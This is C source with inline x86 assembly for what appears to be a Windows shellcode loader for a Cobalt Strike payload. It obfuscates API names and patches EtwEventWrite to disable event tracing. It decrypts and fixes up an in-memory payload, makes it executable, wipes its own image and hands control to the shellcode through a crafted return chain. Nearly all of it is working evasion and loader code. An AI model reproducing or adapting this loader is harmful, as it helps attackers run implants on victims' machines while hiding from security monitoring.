#include "header.h"

__declspec(noinline) void *caller(void)
{
    return _ReturnAddress();
}

__declspec(noinline) void *resolve_func(unsigned char i)
{
    char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l', 0x00};
    char virtual_alloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c', 0x00};
    char virtual_protect[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x00};
    char virtual_free[] = {'V','i','r','t','u','a','l','F','r','e','e', 0x00};

    void *kernel32 = GetModuleHandleA(kernel32_dll);

    if (i == 0)
        return GetProcAddress(kernel32, virtual_alloc);
    else if (i == 1)
        return GetProcAddress(kernel32, virtual_protect);
    else if (i == 2)
        return GetProcAddress(kernel32, virtual_free);
    else return NULL;
}

void tea_decrypt(unsigned char *data, unsigned char *key)
{
  unsigned int i;
  unsigned char x = 0;

  unsigned int delta = 0x9e3779b9;
  unsigned int sum = delta * 32;

  unsigned int v0 = *(unsigned int *)data;
  unsigned int v1 = *(unsigned int *)(data + 4);

  for (i = 0; i < 32; i++) {
    v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + ((unsigned int *)key)[(sum >> 11) & 3]);
    sum -= delta;
    v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + ((unsigned int *)key)[sum & 3]);
  }

  *(unsigned int *)data = v0;
  *(unsigned int *)(data + 4) = v1;
}


void patch_etw()
{
    char etw[] = {0x01,0x30,0x33,0x01,0x32,0x21,0x2a,0x30,0x13,0x36,0x2d,0x30,0x21,0x44};

    for (int j = 0; j < sizeof(etw); j++)
    {
        etw[j] ^= 0x44;
    }
    
    char ntdll_dll[] = {'n','t','d','l','l','.','d','l','l', 0x00};

    uintptr_t etweventwrite = GetProcAddress(GetModuleHandleA(ntdll_dll), etw);
    
    unsigned int oldprotect = 0;

    _pVirtualProtect pVirtualProtect = (_pVirtualProtect)resolve_func((unsigned char)1);
    pVirtualProtect(etweventwrite, 16, PAGE_EXECUTE_READWRITE, &oldprotect);

    *(unsigned int*)etweventwrite = 0x000014c2;

    pVirtualProtect(etweventwrite, 16, oldprotect, &oldprotect);
}



__declspec(noinline) 
int main_func()
{
  /* instruction at return address is address of BaseThreadInitThunk */
  uintptr_t prev_caller_addr = _AddressOfReturnAddress();

  morphcode(999);
  patch_etw();

  char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l', 0x00};
  char ntdll_dll[] = {'n','t','d','l','l','.','d','l','l', 0x00};

  void *dest = GetModuleHandleA(NULL);

  /* Load payload to memory */
  unsigned int enc_shellcode_size = 0;
  /* memory pos. where shellcode will be stored */
  unsigned char *shellcode_base = 0;

  load_payload_to_mem(&enc_shellcode_size, &shellcode_base);

  morphcode(key);

  /* resolve shellcode apis */
  short offset = *(short*)shellcode_base;
  char *shellcode = shellcode_base + 0x02 + offset;

  short *p = shellcode_base + 0x02;

  morphcode(p);

  for (p; *p && *(p+1);)
  {
    short index = *p;
    (char*)p += 0x03;

    if (*(unsigned int*)p == 0x74736564) /* cobalt dest to jump to */
    {
      #ifndef SHELLCODE_DATA
      *(unsigned int*)(shellcode + index) = dest;
      #else
      *(unsigned int*)(shellcode + index) = (char*)dest + 0x1000;
      #endif
    } else if (*(unsigned int*)p == 0x65736162){ /* shellcode base to free */
      *(unsigned int*)(shellcode + index) = shellcode_base;
    } else {
      void *module = GetProcAddress(GetModuleHandleA(kernel32_dll), p);
      *(unsigned int*)(shellcode + index) = module;
    }
    
    while (*(char*)p)
    {
      (char*)p += 1;
    }

    (char*)p += 1;
  }

  unsigned int oldprotect = 0;

  void *pVirtualProtect = resolve_func((unsigned char)1);
  ((_pVirtualProtect)pVirtualProtect)(shellcode, 1562, PAGE_EXECUTE_READ, &oldprotect);

  /* coablt .exe doesn't work if target location we write to isn't 0
   * lock cmpxchg ds:[ ], edi - cmp if ds : [ ] == eax
   * if true moves edi to ds : [ ]
   * our implementation contained encrypted cobalt there, the PE bytes
   * were non-zero, encrypted by our cipher while if we stop using encryption
   * there are padded null bytes there, so unencrypted cobalt works, while ours 
   * doesn't work.
   */
  char rtl_zeromemory[] = {'R','t','l','Z','e','r','o','M','e','m','o','r','y', 0x00};

  uintptr_t rtlzeromemory = GetProcAddress(GetModuleHandleA(kernel32_dll), rtl_zeromemory);

  /* LdrLoadDll functin calls certain function which read values from image NT header
   * (RtlImageNTHeader) so we cannot zero main Image PE header, we need to keep the NT header.
   */

  unsigned int self_image_size =  *(unsigned int*)((char*)dest + *(unsigned int*)((char*)dest + 0x3C) + 0x50);
  unsigned int self_header_size = *(unsigned int*)((char*)dest + *(unsigned int*)((char*)dest + 0x3C) + 0x54);
  unsigned int size_zero_memory = self_image_size - self_header_size;
  char *dest_zero_memory = (char*)dest + self_header_size;

  /* ((_pVirtualProtect)pVirtualProtect)(dest, self_image_size, PAGE_EXECUTE_READWRITE, &oldprotect); */
  morphcode(dest_zero_memory);

  __asm
  {
    push prev_caller_addr ; address of return address to BaseThreadInitThunk on stack

    push size_zero_memory
    push dest_zero_memory
    push shellcode ; return address to shellcode on heap

    lea eax, oldprotect
    push eax
    push PAGE_READWRITE
    push self_image_size
    push dest
    push rtlzeromemory
    push pVirtualProtect
    mov ebp, [ebp] ; pops BaseThreadInitThunk ebp
    ret
  }
  
  return 0;
}

#pragma optimize( "", off )
/* __declspec(naked) defined function is generate without prologue
   and epilogue.
 */
__declspec(naked) 
void entry()
{
  __asm
  {
    jmp main_func
  }

}
#pragma optimize( "", on )

